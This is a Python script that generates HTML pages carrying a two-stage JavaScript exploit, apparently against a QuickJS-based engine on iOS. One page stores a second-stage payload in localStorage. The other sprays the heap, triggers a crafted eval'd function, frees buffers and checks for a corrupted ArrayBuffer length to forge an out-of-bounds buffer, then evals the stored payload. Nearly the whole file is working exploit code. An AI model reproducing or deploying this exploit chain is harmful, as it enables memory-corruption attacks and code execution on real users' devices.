#!/usr/bin/env python3
"""Build the single-script/localStorage fallback pair.

Seed widget: stores stage B (3,617 B) in localStorage under key n1s2.
Exploit widget: ONE executable script (stage A only, no second script and no
text/plain node); after the forge it reads localStorage[n1s2] and evals it.
Host-only generator.
"""
import argparse, hashlib, json, os, zlib

HERE=os.path.dirname(os.path.abspath(__file__)); LAB=os.path.dirname(HERE)
ROOT=os.path.dirname(os.path.dirname(LAB))
STAGE_B=os.path.join(ROOT,'lab','qjs_postsnapshot','ios_n1','payload','n1ios_stage2_ab72.js')
PAT=("[0,0,0,0,1,0,0,0,255,255,0,0,255,255,255,255,255,255,255,255,"
     "255,255,255,255,1,0,0,0,255,255,255,255,255,255,255,255,255,255,255,255]")
SRC=('"use strict";(function ([] = eval("(")) { var q1=0,q2=0,q3=0; '
     'return ' + '+'.join(['1.5']*34) + '; })')

def stage_a(N,H,HN,VK0):
    return f'''"use strict";
var N={N},H={H},HN={HN},VK={VK0};
var PAT={PAT};
if (globalThis.PAT !== PAT) {{
  globalThis.RESULT="RESULT NO_TOPS";
  try{{document.getElementById("v").textContent=globalThis.RESULT;}}catch(e){{}}
}} else {{
var S=new Array(N),fb=new Uint8Array(40);
for(var j=0;j<40;j++)fb[j]=PAT[j];
for(var i=0;i<N;i++){{var u=new Uint8Array(957);S[i]=u;}}
for(var k=0;k<HN;k++)S[H+k]=null;
globalThis.f=(0,eval)({SRC!r});
var D=new Array(800);for(var i=0;i<800;i++)D[i]=new ArrayBuffer(64);
var TN=600,T=new Array(TN),TV=new Array(TN);
for(var i=0;i<TN;i++){{T[i]=new ArrayBuffer(72);TV[i]=new Uint8Array(T[i]);}}
var PH=[4,12,20,28,36],VKS=[{VK0},{VK0}-10,{VK0}-20,{VK0}-30,{VK0}-40];
var hit=-1,len=0,ph=-1,vk=-1,nt=0;
for(var pi=0;pi<5&&hit<0;pi++){{
  var p=PH[pi];
  for(var i=0;i<N;i++){{if(S[i]){{for(var o=p;o+40<=957;o+=40)S[i].set(fb,o);}}}}
  for(var vi=0;vi<5&&hit<0;vi++){{
    var v=VKS[vi]; if(v<16) continue;
    for(var r=0;r<8;r++){{var j=v-2*r;T[j]=null;TV[j]=null;}}
    try{{f();}}catch(e){{}}
    nt++;
    for(var i=0;i<TN;i++){{if(T[i]!==null&&T[i].byteLength!==72){{hit=i;len=T[i].byteLength;ph=p;vk=v;break;}}}}
  }}
}}
if(hit>=0){{globalThis.AB=T[hit];globalThis.ABV=TV[hit];globalThis.N1LEAK="FORGED";}}
globalThis.RESULT="RESULT LS C=34 SZ=957 N={N} H={H} HN={HN} HIT="+hit+" LEN="+len+" PH="+ph+" VK="+vk+" NT="+nt;
globalThis.N1MARK=globalThis.RESULT;
try{{document.getElementById("v").textContent=globalThis.RESULT;}}catch(e){{}}
try{{console.log("N1A:"+globalThis.RESULT);}}catch(e){{}}
var s2=null; try{{s2=localStorage.getItem("n1s2");}}catch(e){{}}
globalThis.RESULT += " S2LEN=" + (s2===null ? -1 : s2.length);
try{{document.getElementById("v").textContent=globalThis.RESULT;}}catch(e){{}}
if(hit>=0 && s2){{ try{{(0,eval)(s2);}}catch(e2){{}} }}
}}
'''

def main():
    ap=argparse.ArgumentParser(); ap.add_argument('--N',type=int,default=3000)
    ap.add_argument('--HN',type=int,default=64); ap.add_argument('--H',type=int,nargs='+',default=[64,200,400,500])
    ap.add_argument('--VK',type=int,default=598); args=ap.parse_args()
    B=open(STAGE_B).read(); outdir=os.path.join(LAB,'payload'); os.makedirs(outdir,exist_ok=True)
    seed=('<!doctype html><html><head><meta charset="utf-8"></head><body>\n'
          '<div id="v">N1IOS_SEED</div>\n<script>try{var B='+json.dumps(B)+';'
          'localStorage.setItem("n1s2",B);document.getElementById("v").textContent="SEED OK "+B.length;}'
          'catch(e){document.getElementById("v").textContent="SEED ERR "+e;}</script>\n</body></html>')
    open(os.path.join(outdir,'ls_seed.html'),'w').write(seed)
    print('ls_seed.html raw=%d zlib9=%d sha256=%s'%(len(seed),len(zlib.compress(seed.encode(),9)),hashlib.sha256(seed.encode()).hexdigest()))
    for H in args.H:
        a=stage_a(args.N,H,args.HN,args.VK)
        html=('<!doctype html><html><head><meta charset="utf-8"></head><body>\n'
              '<div id="v">N1IOS_LS</div>\n<script>'+a+'</script>\n</body></html>')
        p=os.path.join(outdir,f'ls_final_h{H}.html'); open(p,'w').write(html)
        print(f'ls_final_h{H}.html raw={len(html)} zlib9={len(zlib.compress(html.encode(),9))} sha256={hashlib.sha256(html.encode()).hexdigest()}')
if __name__=='__main__': main()
